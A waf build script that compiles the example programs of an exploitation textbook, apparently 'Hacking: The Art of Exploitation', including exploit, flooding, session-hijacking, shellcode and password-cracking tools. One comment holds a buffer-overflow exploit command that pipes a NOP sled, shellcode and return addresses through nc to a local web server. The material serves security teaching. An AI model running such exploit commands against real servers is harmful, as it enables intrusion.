import platform


def options(opt):
    opt.add_option('--release', action='store_true', dest='release',
                   help='configure release build')
    opt.load('compiler_c')


def add_cflags(env, flags):
    env.CFLAGS = env.CFLAGS[:]
    env.append_unique('CFLAGS', flags)


def configure_cc(conf, release=False):
    if release:
        add_cflags(conf.env, ['-O2', '-DNDEBUG'])
    else:
        add_cflags(conf.env, ['-O0', '-g'])


def configure(conf):
    conf.load('compiler_c')
    configure_cc(conf, conf.options.release)
    # For asseembly
    # https://waf.io/apidocs/tools/asm.html
    if platform.system() != 'Darwin':
        # conf.load('gcc gas')
        conf.load('nasm')
        # 'var' is required. The document is incorrect.
        conf.find_program('ld', var='ASLINK')
        conf.env.append_unique('ASFLAGS', ['-f', 'elf'])

    conf.check_cfg(path='libnet-config', args='--defines',
                   package='', uselib_store='LIBNET', mandatory=False)


def build(bld):
    # Chapter 0x200 Programming
    bld.program(source='firstprog.c', target='firstprog')
    bld.program(source='char_array.c', target='char_array')
    bld.program(source='char_array2.c', target='char_array2')
    bld.program(source='datatype_sizes.c', target='datatype_sizes')
    bld.program(source='pointer.c', target='pointer')
    bld.program(source='addressof.c', target='addressof')
    bld.program(source='addressof2.c', target='addressof2')
    bld.program(source='fmt_strings.c', target='fmt_strings')
    bld.program(source='input.c', target='input')
    bld.program(source='typecasting.c', target='typecasting')
    bld.program(source='pointer_types.c', target='pointer_types')
    bld.program(source='pointer_types2.c', target='pointer_types2')
    bld.program(source='pointer_types3.c', target='pointer_types3')
    bld.program(source='pointer_types4.c', target='pointer_types4')
    bld.program(source='pointer_types5.c', target='pointer_types5')
    bld.program(source='commandline.c', target='commandline')
    bld.program(source='convert.c', target='convert')
    bld.program(source='convert2.c', target='convert2')
    bld.program(source='scope.c', target='scope')
    bld.program(source='scope2.c', target='scope2')
    bld.program(source='scope3.c', target='scope3')
    bld.program(source='static.c', target='static')
    bld.program(source='static2.c', target='static2')
    bld.program(source='stack_example.c', target='stack_example')
    bld.program(source='memory_segments.c', target='memory_segments')
    bld.program(source='heap_example.c', target='heap_example')
    bld.program(source='errorchecked_heap.c', target='errorchecked_heap')
    bld.program(source='simplenote.c', target='simplenote')
    bld.program(source='bitwise.c', target='bitwise')
    bld.program(source='fcntl_flags.c', target='fcntl_flags')
    bld.program(source='uid_demo.c', target='uid_demo')
    bld.program(source='notetaker.c', target='notetaker')
    bld.program(source='notesearch.c', target='notesearch')
    bld.program(source='time_example.c', target='time_example')
    bld.program(source='time_example2.c', target='time_example2')
    bld.program(source='funcptr_example.c', target='funcptr_example')
    bld.program(source='rand_example.c', target='rand_example')
    bld.program(source='game_of_chance.c', target='game_of_chance')

    # Chapter 0x300 Exploitation
    bld.program(source='overflow_example.c', target='overflow_example')
    bld.program(source='exploit_notesearch.c', target='exploit_notesearch')
    bld.program(source='auth_overflow.c', target='auth_overflow')
    bld.program(source='auth_overflow2.c', target='auth_overflow2')
    bld.program(source='getenv_example.c', target='getenv_example')
    bld.program(source='getenvaddr.c', target='getenvaddr')
    bld.program(source='exploit_notesearch_env.c', target='exploit_notesearch_env')
    bld.program(source='fmt_uncommon.c', target='fmt_uncommon')
    bld.program(source='fmt_uncommon2.c', target='fmt_uncommon2')
    bld.program(source='fmt_vuln.c', target='fmt_vuln')
    bld.program(source='dtors_sample.c', target='dtors_sample')

    # Chapter 0x400 Networking
    bld.program(source='simple_server.c', target='simple_server')
    bld.program(source='host_lookup.c', target='host_lookup')
    bld.program(source='webserver_id.c', target='webserver_id')
    bld.program(source='tinyweb.c', target='tinyweb')
    bld.program(source='raw_tcpsniff.c', target='raw_tcpsniff')
    bld.program(source='pcap_sniff.c', target='pcap_sniff', lib=['pcap'])
    bld.program(source='decode_sniff.c', target='decode_sniff', lib=['pcap'])
    if platform.system() != 'Darwin':
        bld.program(source='synflood.c', target='synflood', lib=['net'], use=['LIBNET'])
        bld.program(source='rst_hijack.c', target='rst_hijack', lib=['net', 'pcap'], use=['LIBNET'])
        bld.program(source='shroud.c', target='shroud', lib=['net', 'pcap'], use=['LIBNET'])
    bld.program(source='tinyweb_exploit.c', target='tinyweb_exploit')
    bld.program(source='tinyweb_exploit2.c', target='tinyweb_exploit2')

    # Chapter 0x500 SHELLCODE
    bld.program(source='helloworld.c', target='helloworld')

    if platform.system() != 'Darwin':
        bld(features='asm asmprogram',
            source='helloworld.asm',
            # source='helloworld.S',
            target='helloworldasm')

    bld.program(source='exec_shell.c', target='exec_shell')
    bld.program(source='drop_privs.c', target='drop_privs')
    bld.program(source='bind_port.c', target='bind_port')

    # Chapter 0x600 Countermeasures
    bld.program(source='signal_example.c', target='signqal_example')
    bld.program(source='tinywebd.c', target='tinywebd')

    # exploit command line
    # (perl -e 'print "\x90"x333'; cat loopback_shell ; perl -e 'print "\x04\xfa\xff\xbf"x32 . "\r\n"') | nc -w 1 -v 127.0.0.1 80

    bld.program(source='addr_struct.c', target='addr_struct')
    bld.program(source='vuln.c', target='vuln')
    bld.program(source='aslr_demo.c', target='aslr_demo')

    # Chapter 0x700 Cryptology
    if platform.system() != 'Darwin':
        crypt_lib = ['crypt']
    else:
        crypt_lib = []

    bld.program(source='crypt_test.c', target='crypt_test', lib=crypt_lib)
    bld.program(source='crypt_crack.c', target='crypt_crack', lib=crypt_lib)
    bld.program(source='ppm_gen.c', target='ppm_gen', lib=crypt_lib)
    bld.program(source='ppm_crack.c', target='ppm_crack', lib=crypt_lib)
    bld.program(source='fms.c', target='fms')
